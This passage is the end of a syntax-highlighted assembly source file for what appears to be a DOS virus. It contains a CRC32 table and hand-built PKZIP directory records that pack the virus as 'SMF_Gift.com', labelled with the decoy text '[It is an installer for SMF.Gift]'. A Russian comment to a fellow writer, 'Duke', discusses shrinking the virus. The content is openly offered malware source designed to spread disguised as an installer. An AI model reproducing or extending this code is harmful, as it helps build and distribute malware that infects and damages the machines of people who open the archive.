</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0f3b97148h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">084be41deh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01adad47dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06ddde4ebh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f4d4b551h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">083d385c7h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0136c9856h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0646ba8c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fd62f97ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08a65c9ech</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">014015c4fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063066cd9h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0fa0f3d63h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08d080df5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03b6e20c8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04c69105eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d56041e4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a2677172h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03c03e4d1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04b04d447h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d20d85fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a50ab56bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">035b5a8fah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">042b2986ch</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0dbbbc9d6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0acbcf940h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032d86ce3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045df5c75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dcd60dcfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0abd13d59h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">026d930ach</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">051de003ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8d75180h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfd06116h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021b4f4b5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">056b3c423h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0cfba9599h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8bda50fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02802b89eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05f058808h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c60cd9b2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b10be924h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">02f6f7c87h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058684c11h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c1611dabh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b6662d3dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076dc4190h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001db7106h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">098d220bch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efd5102ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">071b18589h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006b6b51fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09fbfe4a5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8b8d433h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">07807c9a2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00f00f934h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09609a88eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e10e9818h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07f6a0dbbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0086d3d2dh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">091646c97h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e6635c01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06b6b51f4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01c6c6162h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0856530d8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f262004eh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">06c0695edh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01b01a57bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08208f4c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f50fc457h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065b0d9c6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">012b7e950h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">08bbeb8eah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fcb9887ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062dd1ddfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">015da2d49h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08cd37cf3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbd44c65h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">04db26158h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03ab551ceh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a3bc0074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d4bb30e2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04adfa541h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03dd895d7h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0a4d1c46dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d3d6f4fbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04369e96ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0346ed9fch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ad678846h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0da60b8d0h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">044042d73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033031de5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aa0a4c5fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dd0d7cc9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05005713ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0270241aah</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0be0b1010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c90c2086h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05768b525h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0206f85b3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b966d409h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ce61e49fh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">05edef90eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">029d9c998h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0d09822h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c7d7a8b4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059b33d17h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02eb40d81h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0b7bd5c3bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0ba6cadh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0edb88320h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09abfb3b6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003b6e20ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074b1d29ah</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ead54739h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09dd277afh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004db2615h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073dc1683h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e3630b12h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">094643b84h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00d6d6a3eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07a6a5aa8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e40ecf0bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09309ff9dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00a00ae27h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07d079eb1h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0f00f9344h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08708a3d2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01e01f268h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06906c2feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f762575dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0806567cbh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0196c3671h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06e6b06e7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fed41b76h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">089d32be0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010da7a5ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067dd4acch</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0f9b9df6fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08ebeeff9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">017b7be43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060b08ed5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d6d6a3e8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a1d1937eh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">038d8c2c4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04fdff252h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d1bb67f1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a6bc5767h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fb506ddh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048b2364bh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0d80d2bdah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0af0a1b4ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">036034af6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041047a60h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0df60efc3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a867df55h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0316e8eefh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04669be79h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cb61b38ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bc66831ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0256fd2a0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05268e236h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0cc0c7795h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bb0b4703h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0220216b9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05505262fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c5ba3bbeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b2bd0b28h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">02bb45a92h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05cb36a04h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c2d7ffa7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b5d0cf31h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02cd99e8bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05bdeae1dh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">09b64c2b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ec63f226h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0756aa39ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0026d930ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09c0906a9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eb0e363fh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">072076785h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005005713h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">095bf4a82h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e2b87a14h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07bb12baeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00cb61b38h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">092d28e9bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e5d5be0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07cdcefb7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bdbdf21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">086d3d2d4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f1d4e242h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">068ddb3f8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fda836eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">081be16cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f6b9265bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06fb077e1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">018b74777h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">088085ae6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ff0f6a70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066063bcah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011010b5ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08f659effh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f862ae69h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0616bffd3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0166ccf45h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a00ae278h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d70dd2eeh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04e048354h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03903b3c2h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0a7672661h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d06016f7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04969474dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03e6e77dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aed16a4ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d9d65adch</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">040df0b66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">037d83bf0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a9bcae53h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0debb9ec5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">047b2cf7fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030b5ffe9h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0bdbdf21ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cabac28ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053b39330h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024b4a3a6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bad03605h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdd70693h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">054de5729h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">023d967bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b3667a2eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c4614ab8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05d681b02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02a6f2b94h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0b40bbe37h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c30c8ea1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05a05df1bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02d02ef8dh</span><span class="sc0">

</span><span class="sc5">ZipDir</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">02014b50h</span><span class="sc0">    </span><span class="sc1">; PKZIP central directory record</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">79adh</span><span class="sc4">,</span><span class="sc2">266ah</span><span class="sc0">
</span><span class="sc5">crc2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">CRC</span><span class="sc0">  </span><span class="sc1">; crc?!</span><span class="sc0">
</span><span class="sc5">len3</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">viclen</span><span class="sc0">
</span><span class="sc5">len4</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">viclen</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SMF_Gift.com'</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06054b50h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3ah</span><span class="sc0">  </span><span class="sc1">; directory size</span><span class="sc0">
</span><span class="sc5">vSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2ah</span><span class="sc4">+</span><span class="sc5">virlen</span><span class="sc4">+</span><span class="sc5">viclen</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dirlen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ZipDir</span><span class="sc0">
</span><span class="sc5">virend</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc5">virlen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virend</span><span class="sc4">-</span><span class="sc5">RealStart</span><span class="sc0">
</span><span class="sc5">virlen1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virlen</span><span class="sc4">+</span><span class="sc2">2ah</span><span class="sc0">
</span><span class="sc5">Victim</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;  !! MESSAGE FOR DUKE!!! MESSAGE FOR DUKE!!! MESSAGE FOR DUKE!!! MESSAGE !!!</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[It is an installer for SMF.Gift]'</span><span class="sc0">  </span><span class="sc1">; ВНИМАНИЕ! Учитывая твою</span><span class="sc0">
                                </span><span class="sc1">; склонность к уменьшению размеров вирусов,</span><span class="sc0">
                                </span><span class="sc1">; можешь сэкономить на этой строчке без всяких</span><span class="sc0">
                                </span><span class="sc1">; потерь функциональности на целых 33 байта !-)</span><span class="sc0">
                                </span><span class="sc1">; хотя придется пересчитать CRC здесь:</span><span class="sc0">
</span><span class="sc5">CRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0a3806033h</span><span class="sc0">
</span><span class="sc1">; MESSAGE END  MESSAGE END MESSAGE END MESSAGE END MESSAGE END MESSAGE END</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">



</span><span class="sc5">viclen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">victim</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">02014b50h</span><span class="sc0">    </span><span class="sc1">; copy of central directory record</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">79adh</span><span class="sc4">,</span><span class="sc2">266ah</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">CRC</span><span class="sc0">  </span><span class="sc1">; crc?!</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">viclen</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">viclen</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SMF_Gift.com'</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06054b50h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3ah</span><span class="sc0">  </span><span class="sc1">; directory size</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2ah</span><span class="sc4">+</span><span class="sc5">virlen</span><span class="sc4">+</span><span class="sc5">viclen</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span></div></body>
</html>
